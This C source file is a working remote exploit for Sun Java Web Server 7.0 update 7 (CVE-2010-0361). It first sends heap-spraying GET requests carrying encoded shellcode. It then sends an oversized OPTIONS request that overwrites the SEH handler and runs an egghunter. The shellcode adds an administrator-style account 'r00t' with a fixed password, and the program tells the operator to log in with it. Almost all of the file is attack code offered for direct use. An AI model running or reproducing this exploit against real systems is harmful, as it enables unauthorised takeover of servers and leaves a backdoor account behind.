/* Sun Java Web Server Exploit
 * Tested on:
 * Sun Java Web Server 7.0 update 7 - XP SP3
 * Ref: CVE-2010-0361
 * This vulnerability was identified by Evgeny Legerov
 *
 * Author: Dominic Chell <dmc@deadbeef.co.uk>
 * Date: 23/01/2010
 */
 
#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include "winsock2.h"
 
#pragma comment(lib, "ws2_32")
 
#define usage(){ (void)fprintf(stderr, "SJWSex vs Sun Java Web Server 7.0 u7\n(C) dmc <dmc@deadbeef.co.uk>\n\nExample: sjwsex.exe [ip] [port] 
[directory]\n");}
#define error(e){ (void)fprintf(stderr,"%s\n",e); return -1;}
 
// encoding the payloads in URL hex prevents it getting converted to unicode
char seh[] = "%ee%7b%01%12"; // 0x12017bee
char nextseh[] ="%eb%10%90%90"; // jmp
char *nop = "%90"; // nop
char egghunter[] = "%66%81%CA%FF%0F%42%52%6A%02%58%CD%2E%3C%05%5A%74%EF%B8%77%30%30%74%8B%FA%AF%75%EA%AF%75%E7%FF%E7";
char *egg = "%77%30%30%74%77%30%30%74"; // w00tw00t
// adduser r00t / r00tr00t123
char shellcode[] =
       "%89%e6%db%cd%d9%76%f4%58%50%59%49%49%49%49%43"
       "%43%43%43%43%43%51%5a%56%54%58%33%30%56%58%34"
       "%41%50%30%41%33%48%48%30%41%30%30%41%42%41%41"
       "%42%54%41%41%51%32%41%42%32%42%42%30%42%42%58"
       "%50%38%41%43%4a%4a%49%4b%4c%4d%38%4b%39%45%50"
       "%45%50%43%30%43%50%4d%59%4b%55%46%51%48%52%42"
       "%44%4c%4b%46%32%50%30%4c%4b%46%32%44%4c%4c%4b"
       "%51%42%44%54%4c%4b%42%52%46%48%44%4f%4f%47%51"
       "%5a%47%56%46%51%4b%4f%50%31%49%50%4e%4c%47%4c"
       "%43%51%43%4c%45%52%46%4c%47%50%49%51%48%4f%44"
       "%4d%43%31%48%47%4d%32%4c%30%46%32%46%37%4c%4b"
       "%50%52%44%50%4c%4b%47%32%47%4c%45%51%48%50%4c"
       "%4b%51%50%43%48%4d%55%49%50%44%34%51%5a%45%51"
       "%48%50%50%50%4c%4b%47%38%44%58%4c%4b%50%58%51"
       "%30%45%51%4e%33%4a%43%47%4c%51%59%4c%4b%47%44"
       "%4c%4b%45%51%4e%36%46%51%4b%4f%46%51%49%50%4e"
       "%4c%49%51%48%4f%44%4d%43%31%48%47%50%38%4b%50"
       "%43%45%4a%54%43%33%43%4d%4b%48%47%4b%43%4d%47"
       "%54%43%45%4a%42%46%38%4c%4b%50%58%46%44%45%51"
       "%48%53%42%46%4c%4b%44%4c%50%4b%4c%4b%50%58%45"
       "%4c%43%31%49%43%4c%4b%44%44%4c%4b%45%51%4e%30"
       "%4d%59%50%44%47%54%46%44%51%4b%51%4b%45%31%50"
       "%59%50%5a%46%31%4b%4f%4b%50%46%38%51%4f%50%5a"
       "%4c%4b%42%32%4a%4b%4b%36%51%4d%43%5a%43%31%4c"
       "%4d%4b%35%4e%59%45%50%43%30%43%30%46%30%43%58"
       "%46%51%4c%4b%42%4f%4d%57%4b%4f%48%55%4f%4b%4b"
       "%50%45%4d%46%4a%45%5a%45%38%49%36%4a%35%4f%4d"
       "%4d%4d%4b%4f%48%55%47%4c%45%56%43%4c%44%4a%4d"
       "%50%4b%4b%4d%30%42%55%44%45%4f%4b%50%47%42%33"
       "%42%52%42%4f%42%4a%43%30%46%33%4b%4f%4e%35%45"
       "%33%42%4d%45%34%46%4e%43%55%44%38%45%35%51%30"
       "%46%4f%43%53%47%50%42%4e%45%35%42%54%51%30%43"
       "%45%42%53%45%35%43%42%51%30%44%32%50%30%46%50"
       "%42%54%51%30%43%42%46%50%46%50%42%54%44%32%50"
       "%30%46%50%43%44%46%51%46%52%46%53%47%50%46%4f"
       "%51%51%50%44%51%54%47%50%51%36%46%46%51%30%42"
       "%4e%43%55%44%34%51%30%42%4c%42%4f%45%33%45%31"
       "%42%4c%43%57%43%42%42%4f%44%35%42%50%47%50%51"
       "%51%42%44%42%4d%45%39%42%4e%43%59%42%53%44%34"
       "%44%32%45%31%43%44%42%4f%43%42%42%53%51%30%42"
       "%52%46%50%46%50%42%54%51%30%46%4f%47%31%50%44"
       "%51%54%45%50%45%5a%41%41";
 
int send_buffer(int ipaddr, int port, char *buffer)
{
       SOCKET s;
       struct fd_set mask;
       struct timeval timeout;
       struct sockaddr_in server;
       WSADATA info;
       if (WSAStartup(MAKEWORD(2,0), &info)) error("Unable to start WSA");
 
       s=socket(AF_INET,SOCK_STREAM,0);
       if (s==INVALID_SOCKET) error("[*] socket error");
       server.sin_family=AF_INET;
       server.sin_addr.s_addr=htonl(ipaddr);
       server.sin_port=htons(port);
 
       WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
       timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 
       select(s+1,NULL,&mask,NULL,&timeout);
       if(FD_ISSET(s,&mask))
       {
               if (send(s,buffer,strlen(buffer),0)==SOCKET_ERROR) error("[*] error sending buffer\n");
               closesocket(s);
               return 0;
       }
}
 
int main(int argc, char *argv[])
{
       char *verb="GET /";
       char *options="OPTIONS /";
       char *version=" HTTP/1.0";
       char *directory="";
       char *payload, *ptr, *buffer;
       char nops[31], padding[130];
 
       if(argc < 4)
       {
               usage();
               return 0;
       }
 
       memset(nops, 0x00, sizeof(nops));
       memset(padding, 0x00, sizeof(padding));
 
       int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);
       directory = argv[3];
       fprintf(stderr, "SJWSex vs Sun Java Web Server 7.0 u7\n(C) dmc <dmc@deadbeef.co.uk>\n\n");
 
       // build payload and place shellcode in memory
       payload = (char*)malloc(strlen(egg)+strlen(shellcode)+strlen(verb)+strlen(version)+2);
       memset(payload, 0x00, sizeof(payload));
       ptr=payload;
 
       memcpy(ptr, verb, strlen(verb));
       ptr+=strlen(verb);
       memcpy(ptr, egg, strlen(egg));
       ptr+=strlen(egg);
       memcpy(ptr, shellcode, strlen(shellcode));
       ptr+=strlen(shellcode);
       memcpy(ptr, version, strlen(version));
       ptr+=strlen(version);
       memcpy(ptr, "\n\0", 2);
 
       fprintf(stderr, "%s\n", "[*] Filling memory with shellcode");
       for (int i=0; i<4; i++)
       {
               send_buffer(ipaddr, port, payload);
       }
 
       // build final buffer and overwrite seh
       // [ OPTIONS / | DIRECTORY | PADDING | EGG | SHELLLCODE | NEXTSEH | SEH | NOPS | EGGHUNTER | HTTPVERSION ]
       
buffer=(char*)malloc(strlen(options)+strlen(directory)+strlen(egg)+strlen(shellcode)+strlen(nextseh)+strlen(seh)+strlen(egghunter)+strlen(version)+163);
       memset(buffer, 0x00, sizeof(buffer));
       ptr=buffer;
 
       memcpy(ptr, options, strlen(options));
       ptr+=strlen(options);
       memcpy(ptr, directory, strlen(directory));
       ptr+=strlen(directory);
       memcpy(ptr, "/", 1);
       ptr++;
 
       for(int i=0;i<129;i++)
               padding[i] = 'A';
 
       memcpy(ptr, padding, strlen(padding));
       ptr+=strlen(padding);
 
       memcpy(ptr, egg, strlen(egg));
       ptr+=strlen(egg);
 
       memcpy(ptr, shellcode, strlen(shellcode));
       ptr+=strlen(shellcode);
 
       memcpy(ptr, nextseh, strlen(nextseh));
       ptr+=strlen(nextseh);
 
       memcpy(ptr, seh, strlen(seh));
       ptr+=strlen(seh);
 
       for(int i=0;i<10;i++)
               strcat(nops, nop);
       memcpy(ptr, nops, strlen(nops));
       ptr+=strlen(nops);
 
       memcpy(ptr, egghunter, strlen(egghunter));
       ptr+=strlen(egghunter);
 
       memcpy(ptr, version, strlen(version));
       ptr+=strlen(version);
       memcpy(ptr, "\n\n\0", 3);
 
       fprintf(stderr, "%s\n", "[*] Sending final buffer");
       send_buffer(ipaddr, port, buffer);
       fprintf(stderr, "%s\n", "[*] Wait 2 minutes and connect with r00t / r00tr00t123");
 
       return 0;
}

